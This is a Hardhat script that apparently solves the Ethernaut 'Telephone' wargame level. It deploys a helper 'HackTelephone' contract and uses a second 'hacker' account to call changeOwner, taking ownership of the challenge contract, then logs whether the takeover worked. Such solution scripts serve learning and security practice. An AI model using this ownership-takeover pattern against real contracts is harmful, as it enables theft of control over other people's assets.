// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Telephone";
  const contractAddress = "0xdaBFc64410CEF846a9A74a0875A4dEb9599b8F91";

  // We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // Get current contract owner
  const owner = await contract.owner();
  console.log(`🙍‍♂️ Owner:\n ${owner} \n`);

  // Get accounts
  const [deployerSigner, hackerSigner] = await hre.ethers.getSigners();
  console.log(`🙍‍♂️ Deployer address:\n ${deployerSigner.address} \n`);
  console.log(`🤓 Hacker address:\n ${hackerSigner.address} \n`);

  // We get the contract to deploy
  const HackContract = await hre.ethers.getContractFactory(
    "HackTelephone",
    deployerSigner
  );
  const hackContract = await HackContract.deploy(contractAddress);

  await hackContract.deployed();

  console.log(`✅ HackContract deployed to:\n ${hackContract.address} \n`);

  // Hacking the contract
  const changeOwnerTx = await hackContract
    .connect(hackerSigner)
    .changeOwner(hackerSigner.address);
  await changeOwnerTx.wait((confirms = 1));

  // Get current contract owner
  const newOwner = await contract.owner();
  console.log(`🙍‍♂️ New owner:\n ${newOwner} \n`);
  if (newOwner === hackerSigner.address) {
    console.log(`✅ Contract owner changed to:\n ${newOwner} \n`);
  } else {
    console.log(`❌ Contract owner not changed`);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
